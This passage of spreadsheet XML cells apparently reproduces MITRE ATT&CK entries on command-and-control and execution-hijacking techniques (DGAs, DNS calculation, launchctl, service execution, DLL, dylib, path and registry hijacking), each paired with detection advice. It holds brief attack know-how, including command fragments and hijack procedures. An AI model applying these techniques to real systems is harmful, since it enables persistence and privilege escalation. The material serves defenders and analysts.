    <t>Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)
DGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)
Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)</t>
  </si>
  <si>
    <t>Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.
Machine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)</t>
  </si>
  <si>
    <t>T1568.003</t>
  </si>
  <si>
    <t>DNS Calculation (T1568.003)</t>
  </si>
  <si>
    <t>Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)
One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)</t>
  </si>
  <si>
    <t>Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known.</t>
  </si>
  <si>
    <t>T1569</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.</t>
  </si>
  <si>
    <t>Monitor for command line invocations of tools capable of modifying services that doesn’t correspond to normal usage patterns and known software, patch cycles, etc. Also monitor for changes to executables and other files associated with services. Changes to Windows services may also be reflected in the Registry.</t>
  </si>
  <si>
    <t>T1569.001</t>
  </si>
  <si>
    <t>Launchctl (T1569.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: Process Creation, Service: Service Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.(Citation: Launchctl Man)
Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: &lt;code&gt;launchctl load&lt;/code&gt;,&lt;code&gt;launchctl unload&lt;/code&gt;, and &lt;code&gt;launchctl start&lt;/code&gt;. Adversaries can use scripts or manually run the commands &lt;code&gt;launchctl load -w "%s/Library/LaunchAgents/%s"&lt;/code&gt; or &lt;code&gt;/bin/launchctl load&lt;/code&gt; to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)
</t>
  </si>
  <si>
    <t>Every Launch Agent and Launch Daemon must have a corresponding plist file on disk which can be monitored. Monitor for recently modified or created plist files with a significant change to the executable path executed with the command-line &lt;code&gt;launchctl&lt;/code&gt; command. Plist files are located in the root, system, and users &lt;code&gt;/Library/LaunchAgents&lt;/code&gt; or &lt;code&gt;/Library/LaunchDaemons&lt;/code&gt; folders. 
Monitor command-line execution of the &lt;code&gt;launchctl&lt;/code&gt; command immediately followed by abnormal network connections. [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s with executable paths pointing to &lt;code&gt;/tmp&lt;/code&gt; and &lt;code&gt;/Shared&lt;/code&gt; folders locations are potentially suspicious. 
When removing [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s ensure the services are unloaded prior to deleting plist files.</t>
  </si>
  <si>
    <t>T1569.002</t>
  </si>
  <si>
    <t>Command: Command Execution, Network Traffic: Network Traffic Flow, Process: Process Creation, Service: Service Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (&lt;code&gt;services.exe&lt;/code&gt;) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as &lt;code&gt;sc.exe&lt;/code&gt; and [Net](https://attack.mitre.org/software/S0039).
[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and &lt;code&gt;sc.exe&lt;/code&gt; can accept remote servers as arguments and may be used to conduct remote execution.
Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.</t>
  </si>
  <si>
    <t>Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).</t>
  </si>
  <si>
    <t>T1570</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Metadata, Named Pipe: Named Pipe Metadata, Network Share: Network Share Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.
Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)
Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync)</t>
  </si>
  <si>
    <t>Monitor for file creation and files transferred within a network using protocols such as SMB or FTP. Unusual processes with internal network connections creating files on-system may be suspicious. Consider monitoring for abnormal usage of utilities and command-line arguments that may be used in support of remote transfer of files. Considering monitoring for alike file hashes or characteristics (ex: filename) that are created on multiple hosts.</t>
  </si>
  <si>
    <t>T1571</t>
  </si>
  <si>
    <t>Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.
Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.(Citation: change_rdp_port_conti)</t>
  </si>
  <si>
    <t>Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1572</t>
  </si>
  <si>
    <t xml:space="preserve">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traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. 
There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) 
[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) 
Adversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. </t>
  </si>
  <si>
    <t>Monitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. 
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application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1573</t>
  </si>
  <si>
    <t>Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.</t>
  </si>
  <si>
    <t>SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)
In general, 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communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1573.001</t>
  </si>
  <si>
    <t>Symmetric Cryptography (T1573.001)</t>
  </si>
  <si>
    <t>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DES, 3DES, Blowfish, and RC4.</t>
  </si>
  <si>
    <t>With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.
In general, 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communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)</t>
  </si>
  <si>
    <t>T1573.002</t>
  </si>
  <si>
    <t>Asymmetric Cryptography (T1573.002)</t>
  </si>
  <si>
    <t>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 freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.
For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).</t>
  </si>
  <si>
    <t>T1574</t>
  </si>
  <si>
    <t>Defense Evasion, Persistence, Privilege Escalation</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Service: Service Metadata, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.
There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.</t>
  </si>
  <si>
    <t>Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.
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Monitor for changes to environment variables, as well as the commands to implement these changes.
Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.
Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.</t>
  </si>
  <si>
    <t>T1574.001</t>
  </si>
  <si>
    <t>DLL Search Order Hijacking (T1574.001)</t>
  </si>
  <si>
    <t>File: File Creation, File: File Modification, Module: Module Load</t>
  </si>
  <si>
    <t>Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.
There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)
Phantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Hexacorn DLL Hijacking)(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.
Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)
If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.</t>
  </si>
  <si>
    <t>Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of `.manifest` and `.local` redirection files that do not correlate with software updates are suspicious.</t>
  </si>
  <si>
    <t>T1574.002</t>
  </si>
  <si>
    <t>DLL Side-Loading (T1574.002)</t>
  </si>
  <si>
    <t>File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).
Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)</t>
  </si>
  <si>
    <t>Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.</t>
  </si>
  <si>
    <t>T1574.004</t>
  </si>
  <si>
    <t>Dylib Hijacking (T1574.004)</t>
  </si>
  <si>
    <t>Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with &lt;code&gt;@rpath&lt;/code&gt;, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the &lt;code&gt;LC_LOAD_WEAK_DYLIB&lt;/code&gt; function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.
Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)</t>
  </si>
  <si>
    <t>Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. 
Run path dependent libraries can include &lt;code&gt;LC_LOAD_DYLIB&lt;/code&gt;, &lt;code&gt;LC_LOAD_WEAK_DYLIB&lt;/code&gt;, and &lt;code&gt;LC_RPATH&lt;/code&gt;. Other special keywords are recognized by the macOS loader are &lt;code&gt;@rpath&lt;/code&gt;, &lt;code&gt;@loader_path&lt;/code&gt;, and &lt;code&gt;@executable_path&lt;/code&gt;.(Citation: Apple Developer Doco Archive Run-Path) These loader instructions can be examined for individual binaries or frameworks using the &lt;code&gt;otool -l&lt;/code&gt; command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Github EmpireProject HijackScanner)</t>
  </si>
  <si>
    <t>T1574.005</t>
  </si>
  <si>
    <t>Executable Installer File Permissions Weakness (T1574.005)</t>
  </si>
  <si>
    <t>File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Service: Service Metadata</t>
  </si>
  <si>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 Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).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t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>T1574.006</t>
  </si>
  <si>
    <t>Dynamic Linker Hijacking (T1574.006)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation</t>
  </si>
  <si>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</si>
  <si>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</si>
  <si>
    <t>T1574.007</t>
  </si>
  <si>
    <t>Path Interception by PATH Environment Variable (T1574.007)</t>
  </si>
  <si>
    <t>File: File Creation, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>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</si>
  <si>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</si>
  <si>
    <t>T1574.008</t>
  </si>
  <si>
    <t>Path Interception by Search Order Hijacking (T1574.008)</t>
  </si>
  <si>
    <t>Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.
Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.
For example, "example.exe" runs "cmd.exe" with the command-line argument &lt;code&gt;net user&lt;/code&gt;. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then &lt;code&gt;cmd.exe /C net user&lt;/code&gt; will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)
Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).</t>
  </si>
  <si>
    <t xml:space="preserve">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
</t>
  </si>
  <si>
    <t>T1574.009</t>
  </si>
  <si>
    <t>Path Interception by Unquoted Path (T1574.009)</t>
  </si>
  <si>
    <t>Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.
Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., &lt;code&gt;C:\unsafe path with space\program.exe&lt;/code&gt; vs. &lt;code&gt;"C:\safe path with space\program.exe"&lt;/code&gt;). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is &lt;code&gt;C:\program files\myapp.exe&lt;/code&gt;, an adversary may create a program at &lt;code&gt;C:\program.exe&lt;/code&gt; that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)
This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.</t>
  </si>
  <si>
    <t>T1574.010</t>
  </si>
  <si>
    <t>Services File Permissions Weakness (T1574.010)</t>
  </si>
  <si>
    <t>File: File Creation, File: File Modification, Process: Process Creation, Service: Service Metadata</t>
  </si>
  <si>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</si>
  <si>
    <t xml:space="preserve">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 </t>
  </si>
  <si>
    <t>T1574.011</t>
  </si>
  <si>
    <t>Services Registry Permissions Weakness (T1574.011)</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Service: Service Modification, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services&lt;/code&gt;. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)
If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).
Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the &lt;code&gt;FailureCommand&lt;/code&gt; key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)
The &lt;code&gt;Performance&lt;/code&gt; key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the &lt;code&gt;Performance&lt;/code&gt; key is not already present and if an adversary-controlled user has the &lt;code&gt;Create Subkey&lt;/code&gt; permission, adversaries may create the &lt;code&gt;Performance&lt;/code&gt; key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)
Adversaries may also add the &lt;code&gt;Parameters&lt;/code&gt; key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll&lt;/code&gt;.(Citation: malware_hides_service)</t>
  </si>
  <si>
    <t>Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.
Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.</t>
  </si>
  <si>
    <t>T1574.012</t>
  </si>
  <si>
    <t>COR_PROFILER (T1574.012)</t>
  </si>
  <si>
    <t>Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)
The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)
Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)</t>
  </si>
  <si>
    <t>For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.</t>
  </si>
  <si>
    <t>T1574.013</t>
  </si>
  <si>
    <t>KernelCallbackTable (T1574.013)</t>
  </si>
  <si>
    <t>Adversaries may abuse the &lt;code&gt;KernelCallbackTable&lt;/code&gt; of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The &lt;code&gt;KernelCallbackTable&lt;/code&gt; can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once &lt;code&gt;user32.dll&lt;/code&gt; is loaded.(Citation: Windows Process Injection KernelCallbackTable)
An adversary may hijack the execution flow of a process using the &lt;code&gt;KernelCallbackTable&lt;/code&gt; by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.
